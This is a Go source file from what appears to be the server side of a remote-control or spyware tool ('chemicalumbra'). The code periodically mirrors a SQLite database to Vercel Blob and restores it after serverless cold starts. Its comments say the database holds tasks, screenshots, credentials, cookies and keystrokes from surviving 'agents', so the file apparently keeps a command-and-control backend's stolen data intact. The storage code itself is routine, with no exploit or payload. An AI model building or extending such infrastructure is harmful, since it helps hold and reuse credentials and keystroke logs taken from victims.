package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"chemicalumbra.dev/server/pkg/filetransfer"
)

// The serverless filesystem is per-instance and wiped on a cold start, so the
// SQLite file (tasks, screenshots, credentials, cookies, keystrokes) evaporates
// between requests while agents survive via the Edge Config snapshot. Mirror the
// whole DB file to Blob on a timer and pull it back before the first open, so a
// cold instance resumes instead of starting from an empty schema.
const (
	dbSnapshotID  = "umbra-db-snapshot"
	dbSnapshotKey = "umbra_db_ref"
)

var (
	dbSnapshotMu   sync.Mutex
	dbSnapshotPath string
	dbLastSig      string
)

// RestoreDBFromBlob pulls the last snapshot into dbPath. Call it BEFORE db.Init
// opens the file — once SQLite has created an empty database the restore is
// pointless.
func RestoreDBFromBlob(dbPath string) {
	if dbPath == "" || !filetransfer.BlobEnabled() {
		return
	}
	ref := edgeGet(dbSnapshotKey)
	if ref == "" {
		return
	}
	host, id, ok := splitBlobRef(ref)
	if !ok {
		return
	}
	data, err := filetransfer.ReadBlob(host, id)
	if err != nil || len(data) < 512 {
		log.Printf("[dbstore] restore skipped: %v (len=%d)", err, len(data))
		return
	}
	if err := os.MkdirAll(filepath.Dir(dbPath), 0755); err != nil && filepath.Dir(dbPath) != "." {
		log.Printf("[dbstore] restore mkdir: %v", err)
	}
	// A half-written WAL from a previous life would shadow the restored file.
	_ = os.Remove(dbPath + "-wal")
	_ = os.Remove(dbPath + "-shm")
	if err := os.WriteFile(dbPath, data, 0644); err != nil {
		log.Printf("[dbstore] restore write: %v", err)
		return
	}
	log.Printf("[dbstore] restored %d bytes into %s", len(data), dbPath)
}

// StartDBSnapshotter mirrors the DB file to Blob whenever it changes.
func StartDBSnapshotter(dbPath string) {
	if dbPath == "" || !filetransfer.BlobEnabled() {
		return
	}
	dbSnapshotMu.Lock()
	if dbSnapshotPath == dbPath {
		dbSnapshotMu.Unlock()
		return
	}
	dbSnapshotPath = dbPath
	dbSnapshotMu.Unlock()

	go func() {
		for {
			time.Sleep(20 * time.Second)
			snapshotDB()
		}
	}()
}

func snapshotDB() {
	dbSnapshotMu.Lock()
	path := dbSnapshotPath
	dbSnapshotMu.Unlock()
	if path == "" || db == nil {
		return
	}
	// Fold the WAL back into the main file so the copy is self-contained.
	_, _ = db.Exec(`PRAGMA wal_checkpoint(TRUNCATE)`)

	fi, err := os.Stat(path)
	if err != nil {
		return
	}
	sig := fmt.Sprintf("%d:%d", fi.Size(), fi.ModTime().UnixNano())
	if sig == dbLastSig {
		return
	}
	data, err := os.ReadFile(path)
	if err != nil || len(data) < 512 {
		return
	}
	ref, err := filetransfer.StoreIntoBlob(dbSnapshotID, data)
	if err != nil {
		log.Printf("[dbstore] snapshot put: %v", err)
		return
	}
	if err := edgeSet(dbSnapshotKey, ref); err != nil {
		log.Printf("[dbstore] snapshot ref: %v", err)
		return
	}
	dbLastSig = sig
	log.Printf("[dbstore] snapshot %d bytes -> %s", len(data), ref)
}

func splitBlobRef(ref string) (host, id string, ok bool) {
	parts := strings.SplitN(ref, "|", 2)
	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
		return "", "", false
	}
	return parts[0], parts[1], true
}

// edgeGet reads one Edge Config item. Empty string means "not there".
func edgeGet(key string) string {
	if edgeConfigID() == "" || edgeReadToken() == "" {
		return ""
	}
	url := fmt.Sprintf("https://edge-config.vercel.com/%s/item/%s?token=%s", edgeConfigID(), key, edgeReadToken())
	client := &http.Client{Timeout: 8 * time.Second}
	res, err := client.Get(url)
	if err != nil {
		return ""
	}
	defer res.Body.Close()
	if res.StatusCode >= 300 {
		return ""
	}
	raw, err := io.ReadAll(io.LimitReader(res.Body, 1<<20))
	if err != nil {
		return ""
	}
	var s string
	if json.Unmarshal(raw, &s) == nil {
		return s
	}
	return strings.Trim(strings.TrimSpace(string(raw)), `"`)
}

// edgeSet upserts one Edge Config item.
func edgeSet(key, value string) error {
	if edgeConfigID() == "" || vercelAPIToken() == "" {
		return fmt.Errorf("edge config not configured")
	}
	body, err := json.Marshal(map[string]any{
		"items": []map[string]any{{"operation": "upsert", "key": key, "value": value}},
	})
	if err != nil {
		return err
	}
	url := fmt.Sprintf("https://api.vercel.com/v1/edge-config/%s/items?teamId=%s", edgeConfigID(), vercelTeamID())
	req, err := http.NewRequest(http.MethodPatch, url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+vercelAPIToken())
	req.Header.Set("Content-Type", "application/json")
	res, err := (&http.Client{Timeout: 8 * time.Second}).Do(req)
	if err != nil {
		return err
	}
	defer res.Body.Close()
	if res.StatusCode >= 300 {
		b, _ := io.ReadAll(io.LimitReader(res.Body, 300))
		return fmt.Errorf("edge set %d: %s", res.StatusCode, bytes.TrimSpace(b))
	}
	return nil
}
